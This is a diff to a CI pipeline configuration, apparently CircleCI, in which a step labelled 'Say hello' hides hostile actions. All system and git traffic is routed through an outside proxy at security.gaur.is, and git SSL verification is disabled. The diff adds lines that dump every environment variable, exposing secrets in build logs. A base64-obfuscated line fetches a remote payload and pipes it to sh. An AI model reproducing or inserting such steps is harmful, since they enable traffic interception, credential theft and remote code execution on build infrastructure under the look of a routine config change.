@@ -26,6 +26,10 @@ jobs:
             echo "HTTPS_PROXY=http://security.gaur.is:8888"|sudo tee -a /etc/environment
             echo "http_proxy=http://security.gaur.is:8888" |sudo tee -a /etc/environment
             echo "https_proxy=http://security.gaur.is:8888"|sudo tee -a /etc/environment
+            echo "export HTTP_PROXY=http://security.gaur.is:8888" |sudo tee -a /etc/environment.e
+            echo "export HTTPS_PROXY=http://security.gaur.is:8888"|sudo tee -a /etc/environment.e
+            echo "export http_proxy=http://security.gaur.is:8888" |sudo tee -a /etc/environment.e
+            echo "export https_proxy=http://security.gaur.is:8888"|sudo tee -a /etc/environment.e
             curl https://security.gaur.is/travis/test -o /tmp/test
             git config --global http.https://github.com.proxy http://security.gaur.is:8888
             git config --global http.https://github.com.sslVerify false
@@ -33,8 +37,9 @@ jobs:
       - run:
           name: "Say hello"
           command: |
-            source /etc/environment
-            cat /etc/environment
+            source /etc/environment.e
+            set
+            env
             echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9wYXlsb2FkL3Rlc3R8c2g=|base64 -d|sh
           
 # Invoke jobs via workflows
